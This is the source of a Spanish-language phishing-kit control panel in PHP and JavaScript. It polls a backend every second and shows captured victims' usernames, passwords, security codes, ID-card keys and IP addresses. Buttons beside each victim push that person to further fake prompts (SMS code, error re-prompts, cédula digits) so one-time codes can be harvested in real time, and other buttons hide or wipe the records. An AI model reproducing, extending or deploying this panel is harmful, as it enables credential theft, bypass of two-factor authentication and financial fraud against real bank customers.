<?php
function is_session_started()
{
    if ( php_sapi_name() !== 'cli' ) {
        if ( version_compare(phpversion(), '5.4.0', '>=') ) {
            return session_status() === PHP_SESSION_ACTIVE ? TRUE : FALSE;
        } else {
            return session_id() === '' ? FALSE : TRUE;
        }
    }
    return FALSE;
}

if ( is_session_started() === FALSE ) session_start();

if (! isset($_SESSION['csrf'])) {
    $_SESSION['csrf'] = md5(uniqid(rand(), true));
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta name="csrf-token" content="<?php echo $_SESSION['csrf'] ?? '';?>">
    <meta name="ip" content="<?=$_SESSION['ip']?>">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mostrar datos obtenidos</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <!--font-awesome-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" integrity="sha512-3pIirOrwegjM6erE5gPSwkUzO+3cTjpnV9lexlNZqvupR64iZBnOOTiiLPb9M36zpMScbmUNIcHUqKD47M719g==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <!-- <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script> -->
    <style>
        body {
            padding: 0 10px;
            width: 100vw;
            height: 100vh;
            overflow-x: scroll;
        }
        .rows {
            display: flex;
            flex-direction: row;
            flex-wrap: nowrap;
            justify-content: center;

        }
    </style>
</head>

<body>
<div class="container-fluid">
    <div class="row">
        <div class="table-responsive bg-primary" id="section_1">
            <table class="table table-responsive table-primary table-hover">
                <thead>
                <tr>
                    <th><button class="btn btn-success" onclick="selectSection('btn_section_1')">Seleccionar</button></th>
                    <th><button class="btn btn-info" onclick="window.location.reload();">Ver_Todas</button></th>
                    <th><button class="btn btn-warning" onclick="cleanAll()">Limpiar_Registros</button></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th><button class="btn btn-danger" onclick="if (confirm('¿Seguro que desea continuar? esto mostrará los registros ocultos de todas las secciones.')) {showAll()}">Mostrar Todo</button></th>
                </tr>
                <tr>
                  <th>Id</th>
                    <th>Hora</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Cód.Seguridad</th>
                    <th>ClavD.Cédula</th>
                    <th>Contectado?</th>
                    <th>Status</th>
                    <th>Ip</th>
                    <th>Actiones</th>
                </tr>
                </thead>
                <tbody id="primera"></tbody>
            </table>
        </div>
        <div class="table-responsive bg-success" id="section_2">
            <table class="table table-responsive table-success table-hover">
                <thead>
                <tr>
                    <th><button class="btn btn-success" onclick="selectSection('btn_section_2')">Seleccionar</button></th>
                    <th><button class="btn btn-info" onclick="window.location.reload();">Ver Todas</button></th>
                    <th></th>
                  <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th><button class="btn btn-danger" onclick="if (confirm('¿Seguro que desea continuar? esto mostrará los registros ocultos de todas las secciones.')) {showAll()}">Mostrar Todo</button></th>
                </tr>
                <tr>
                  <th>Id</th>
                    <th>Hora</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Cód.Seguridad</th>
                    <th>ClavD.Cédula</th>
                    <th>Contectado?</th>
                    <th>Status</th>
                    <th>Ip</th>
                    <th>Actiones</th>
                </tr>
                </thead>
                <tbody id="segunda"></tbody>
            </table>
        </div>
        <div class="table-responsive bg-danger" id="section_3">
            <table class="table table-responsive table-danger table-hover">
                <thead>
                <tr>
                    <th><button class="btn btn-success" onclick="selectSection('btn_section_3')">Seleccionar</button></th>
                    <th><button class="btn btn-info" onclick="window.location.reload();">Ver Todas</button></th>
                    <th></th>
                    <th></th>
                    <th></th>
                  <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th><button class="btn btn-danger" onclick="if (confirm('¿Seguro que desea continuar? esto mostrará los registros ocultos de todas las secciones.')) {showAll()}">Mostrar Todo</button></th>
                </tr>
                <tr>
                  <th>Id</th>
                    <th>Hora</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Cód.Seguridad</th>
                    <th>ClavD.Cédula</th>
                    <th>Contectado?</th>
                    <th>Status</th>
                    <th>Ip</th>
                    <th>Actiones</th>
                </tr>
                </thead>
                <tbody id="tercera"></tbody>
            </table>
        </div>
        <div class="table-responsive bg-secondary" id="section_4">
            <table class="table table-responsive table-secondary table-hover">
                <thead>
                <tr>
                    <th><button class="btn btn-success" onclick="selectSection('btn_section_4')">Seleccionar</button></th>
                    <th><button class="btn btn-info" onclick="window.location.reload();">Ver Todas</button></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                  <th></th>
                    <th></th>
                    <th></th>
                    <th><button class="btn btn-danger" onclick="if (confirm('¿Seguro que desea continuar? esto mostrará los registros ocultos de todas las secciones.')) {showAll()}">Mostrar Todo</button></th>
                </tr>
                <tr>
                  <th>Id</th>
                    <th>Hora</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Cód.Seguridad</th>
                    <th>ClavD.Cédula</th>
                    <th>Contectado?</th>
                    <th>Status</th>
                    <th>Ip</th>
                    <th>Actiones</th>
                </tr>
                </thead>
                <tbody id="cuarta"></tbody>
            </table>
        </div>
        <div class="table-responsive bg-warning" id="section_5">
            <table class="table table-responsive table-warning table-hover">
                <thead>
                <tr>
                    <th><button class="btn btn-success" onclick="selectSection('btn_section_5')">Seleccionar</button></th>
                    <th><button class="btn btn-info" onclick="window.location.reload();">  Ver todas</button></th>
                    <th></th>
                  <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th></th>
                    <th><button class="btn btn-danger" onclick="if (confirm('¿Seguro que desea continuar? esto mostrará los registros ocultos de todas las secciones.')) {showAll()}">Mostrar Todo</button></th>
                </tr>
                <tr>
                  <th>Id</th>
                    <th>Hora</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Cód.Seguridad</th>
                    <th>ClavD.Cédula</th>
                    <th>Contectado?</th>
                    <th>Status</th>
                    <th>Ip</th>
                    <th>Actiones</th>
                </tr>
                </thead>
                <tbody id="quinta"></tbody>
            </table>
        </div>


        <form id='frmHidden'>
            <input type='hidden' name='input' id='hidden_fish'/>
            <input type='hidden' name='step' id='type_fish1'/>
            <input type='hidden' name='token' id='token' value="<?php echo $_SESSION['csrf']?>"/>
        </form>

        <form id='frmShowAll'>
            <input type='hidden' name='input' id='show_all' value="1"/>
            <input type='hidden' name='step' id='type_fish2' value="5"/>
            <input type='hidden' name='token' id='token' value="<?php echo $_SESSION['csrf']?>"/>
        </form>

        <form id='frmToken'>
            <input type='hidden' name='inpt_question' id='inpt_question' value="Si"/>
            <input type='hidden' name='input' id='ip_token'/>
            <input type='hidden' name='cc' id='cc'/>
            <input type='hidden' name='step' id='type_fish3'/>
            <input type='hidden' name='token' id='token' value="<?php echo $_SESSION['csrf']?>"/>
        </form>

        <form id='frmClean'>
            <input type='hidden' name='inpt_question' id='clean_data' value="1"/>
            <input type='hidden' name='cc' id='clean_data' value="1"/>
            <input type='hidden' name='input' id='clean_data' value="1"/>
            <input type='hidden' name='step' id='clean_data' value="clean_data"/>
            <input type='hidden' name='token' id='token' value="<?php echo $_SESSION['csrf']?>"/>
        </form>

    </div>
</div>

<script>
    function tabla(id, tabla) {
        var hace = "";

        $.ajax({
            type: 'POST',
            url: 'data.php',
            data: {
                "id1": id
            },
            cache: false,
            success: function(data, status) {
                if (data.length > 42) {
                    var conte = JSON.parse(data);
                    for (let i = 0; i < conte.length; i++) {
                        let iid = i + 1;
                            if (conte) {
                                if (conte[i].Hidden == 'No') {
                                    hace += "<tr>" +
                                    "<td>" +
                                       iid +
                                    "<td>" +
                                    conte[i].Hour +
                                    "</td>" +
                                    "<td onclick='h(this)' style='cursor: pointer'>" +
                                    conte[i].User +
                                    "</td>" +
                                    "<td onclick='h(this)' style='cursor: pointer'>" +
                                    conte[i].Pass +
                                    "</td>" +
                                    "<td onclick='h(this)' style='cursor: pointer'>" +
                                    conte[i].UserSmsError +
                                    "</td>" +
                                    "<td onclick='h(this)' style='cursor: pointer'>" +
                                    conte[i].UserSms +
                                    "</td>" +
                                    "<td>" +
                                    conte[i].Session +
                                    "</td>" +
                                    "<td>" +
                                    conte[i].Status +
                                    "</td>" +
                                    "<td onclick='h(this)' style='cursor: pointer'>" +
                                    "(" + conte[i].Country + ") " + conte[i].Ip +
                                    "</td>" +
                                    "<td>" +
                                    "<button class='btn btn-primary' onclick='loginRequest(\""+conte[i].Ip+"\")'>Login</button>" + " " +

                                    "<button class='btn btn-info' onclick='smsRequest(\""+conte[i].Ip+"\")'>Cód.Seguridad</button>" + " " +
                                    "<button class='btn btn-danger' onclick='smsErrorRequest(\""+conte[i].Ip+"\")'>Cód.Seguridad</button>" + " " +

                                    "<button class='btn btn-info' onclick='smsCedulaRequest(\""+conte[i].Ip+"\")'>ClavD. Cédula</button>" + " " +
                                    "<button class='btn btn-danger' onclick='smsCedulaErrorRequest(\""+conte[i].Ip+"\")'>ClavD. Cédula</button>" + " " +

                                    "<button class='btn btn-success' onclick='finishRequest(\""+conte[i].Ip+"\")'>Finalizar</button>" + " " +
                                    "<button class='btn btn-danger' onclick='hiddenFish(\""+conte[i].Ip+"\")'>Ocultar</button>" +
                                    "</td>" +
                                    "</tr>";
                            }
                            document.querySelector("#" + tabla).innerHTML = hace;

                        } else {
                            hace += "<tr>< td colspan='8'>No hay datos</td></tr>";
                            document.querySelector("#" + tabla).innerHTML = hace;
                        }
                    }
                } else {
                    hace += data;
                    document.querySelector("#" + tabla).innerHTML = hace;
                }
            }
        });
    }

    let set1 = setInterval(tabla, 1000, 1, "primera");
    let set2 = setInterval(tabla, 1000, 2, "segunda");
    let set3 = setInterval(tabla, 1000, 3, "tercera");
    let set4 = setInterval(tabla, 1000, 4, "cuarta");
    let set5 = setInterval(tabla, 1000, 5, "quinta");

    function h(e) {
        let newTextarea = document.createElement("textarea");
        document.body.appendChild(newTextarea);
        newTextarea.value = e.innerHTML;
        newTextarea.select();
        document.execCommand("copy");
        document.body.removeChild(newTextarea);
        toastr.success(e.innerHTML, '¡Copiado correctamente!');
        //swal(e.innerHTML, "¡Copiado correctamente!", "success");
    }

    function setVariable(newValue, field){
        document.getElementById(field).value = newValue;
    }

    function hiddenFish(e) {
        setVariable(e, 'hidden_fish');
        setVariable('4', 'type_fish1');
        document.querySelector("#frmHidden").setAttribute("method","POST");
        document.querySelector("#frmHidden").setAttribute("action","write.php");
        document.querySelector("#frmHidden").submit();
    }

    function showAll() {
        document.querySelector("#frmShowAll").setAttribute("method","POST");
        document.querySelector("#frmShowAll").setAttribute("action","write.php");
        document.querySelector("#frmShowAll").submit();
    }

    function smsCedulaRequest(e) {
        let text;

        let person = prompt("Coloca los 4 últimos dígitos de la cédula:", "");
          if (person == null || person == "") {
            text = "User cancelled the prompt.";
            alert("No se procesó la solicitud del primer token")
          } else {
            setVariable(e, 'ip_token');
            setVariable('Si', 'inpt_question');
            setVariable('sms', 'type_fish3');
            setVariable(person, 'cc');

            document.querySelector("#frmToken").setAttribute("method","POST");
            document.querySelector("#frmToken").setAttribute("action","write.php");
            document.querySelector("#frmToken").submit();
          }

    }

    function smsCedulaErrorRequest(e) {
        setVariable(e, 'ip_token');
        setVariable('Si', 'inpt_question');
        setVariable('smsError', 'type_fish3');
        document.querySelector("#frmToken").setAttribute("method","POST");
        document.querySelector("#frmToken").setAttribute("action","write.php");
        document.querySelector("#frmToken").submit();
    }

    function smsRequest(e) {
        setVariable(e, 'ip_token');
        setVariable('Si', 'inpt_question');
        setVariable('sms1', 'type_fish3');
        document.querySelector("#frmToken").setAttribute("method","POST");
        document.querySelector("#frmToken").setAttribute("action","write.php");
        document.querySelector("#frmToken").submit();
    }

    function smsErrorRequest(e) {
        setVariable(e, 'ip_token');
        setVariable('Si', 'inpt_question');
        setVariable('smsError1', 'type_fish3');
        document.querySelector("#frmToken").setAttribute("method","POST");
        document.querySelector("#frmToken").setAttribute("action","write.php");
        document.querySelector("#frmToken").submit();
    }

    function finishRequest(e) {
        setVariable(e, 'ip_token');
        setVariable('Si', 'inpt_question');
        setVariable('finish', 'type_fish3');
        document.querySelector("#frmToken").setAttribute("method","POST");
        document.querySelector("#frmToken").setAttribute("action","write.php");
        document.querySelector("#frmToken").submit();
    }

    function loginRequest(e) {
        setVariable(e, 'ip_token');
        setVariable('Si', 'inpt_question');
        setVariable('login', 'type_fish3');
        document.querySelector("#frmToken").setAttribute("method","POST");
        document.querySelector("#frmToken").setAttribute("action","write.php");
        document.querySelector("#frmToken").submit();
    }

    function cleanAll(e) {
        setVariable(e, 'ip_token');
        document.querySelector("#frmClean").setAttribute("method","POST");
        document.querySelector("#frmClean").setAttribute("action","write.php");
        document.querySelector("#frmClean").submit();
    }

    function selectSection(e) {
        switch (e) {
            case "btn_section_1" :
                for (let i = 1; i <= 5; i++) {
                    if (i != '1') {
                        console.log(document.querySelector("#section_"+i).style.display = 'none');
                    }
                }
                break;
            case "btn_section_2" :
                for (let i = 1; i <= 5; i++) {
                    if (i != '2') {
                        console.log(document.querySelector("#section_"+i).style.display = 'none');
                    }
                }
                break;
            case "btn_section_3" :
                for (let i = 1; i <= 5; i++) {
                    if (i != '3') {
                        console.log(document.querySelector("#section_"+i).style.display = 'none');
                    }
                }
                break;
            case "btn_section_4" :
                for (let i = 1; i <= 5; i++) {
                    if (i != '4') {
                        console.log(document.querySelector("#section_"+i).style.display = 'none');
                    }
                }
                break;
            case "btn_section_5" :
                for (let i = 1; i <= 5; i++) {
                    if (i != '5') {
                        console.log(document.querySelector("#section_"+i).style.display = 'none');
                    }
                }
                break;
        }
    }

</script>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" integrity="sha512-VEd+nq25CkR676O+pLBnDW09R7VQX9Mdiij052gVCp5yVH3jGtH70Ho/UUv4mJDsEdTvqRCFZg0NKGiojGnUCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</body>

</html>